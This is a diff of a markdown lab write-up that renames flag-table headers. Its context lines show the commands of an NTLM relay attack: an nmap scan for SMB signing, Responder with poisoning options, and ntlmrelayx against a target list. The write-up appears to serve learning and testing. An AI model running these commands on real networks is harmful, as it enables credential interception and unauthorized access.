@@ -148,9 +148,9 @@ I scanned the network to check SMB signing status using Nmap:
 ```bash
 nmap --script smb2-security-mode -p 445 192.168.5.0/24
 ```
-**Flag Breakdown**
+**Breakdown**
 
-|             Flag            |                                 Meaning                                                   |
+|        Part  |    Description  |
 |-----------------------------|-------------------------------------------------------------------------------------------|
 | `nmap`                        | Network scanning tool used for reconnaissance                                             |
 | `--script smb2-security-mode` | Runs an Nmap NSE script to check SMB v2/v3 security configuration, especially SMB signing |
@@ -201,9 +201,9 @@ I started Responder on my network interface:
 ```bash
 sudo responder -I eth0 -dwv
 ```
-**Flag Breakdown**
+**Breakdown**
 
-|    Flag   |     Meaning       |
+|    Part   |     Description       |
 |-----------|-------------------|
 | `-I eth0`   | Network interface |
 |    `-d`     | DHCP poisoning    |
@@ -222,9 +222,9 @@ In another terminal, I started the relay attack using ntlmrelayx:
 ```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```
-**Flag Breakdown**
+**Breakdown**
 
-|     Flag                       | Meaning                         |
+|     Part                       | Description                         |
 |----------------|-------------------------------------------------|
 | `ntlmrelayx.py`  | Impacket tool used to perform NTLM relay attacks|
 | `-tf targets.txt`|Target file containing a list of SMB targets     |
